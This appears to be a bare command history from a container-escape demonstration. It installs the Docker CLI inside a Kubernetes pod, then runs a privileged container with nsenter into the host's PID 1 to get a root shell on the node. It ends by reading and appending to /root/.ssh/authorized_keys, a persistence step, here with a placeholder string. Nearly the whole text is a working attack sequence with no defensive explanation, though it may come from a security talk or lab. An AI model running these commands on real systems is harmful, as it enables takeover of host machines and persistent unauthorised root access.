kubectl apply -f deployment.yaml
kubectl get pods
kubectl exec -it bashandcurl bash
ps -ef

# Install Docker

apt-get update
apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
apt-key fingerprint 0EBFCD88
add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable"
apt-get update

# Prepped...

apt-get install docker-ce-cli


# docker installed

docker version
docker run hello-world
clear

docker ps
docker exec -it ... bash
exit

# Can we get onto the machine

whoami
uname -a
cat /etc/os-release

docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
whoami
uname -a
cat /etc/os-release

cd /root/.ssh
ls -al
cat authorized_keys
echo OSLO >> authorized_keys